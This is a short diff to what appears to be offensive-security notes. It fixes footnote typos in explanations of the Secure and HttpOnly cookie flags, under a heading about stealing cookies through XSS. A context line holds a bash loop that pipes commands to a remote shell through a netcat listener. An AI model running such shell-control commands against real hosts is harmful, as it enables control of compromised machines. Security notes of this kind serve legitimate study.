@@ -6,6 +6,6 @@ while :; do printf "zemo>$ "; read c; echo $c | nc -vvlp PORTNUMBER >/dev/null; 
 ```
 
 ### XSS to steal cookie
->The Secure3 flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.
+>The Secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.
 
->The HttpOnly4 flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.
+>The HttpOnly flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.
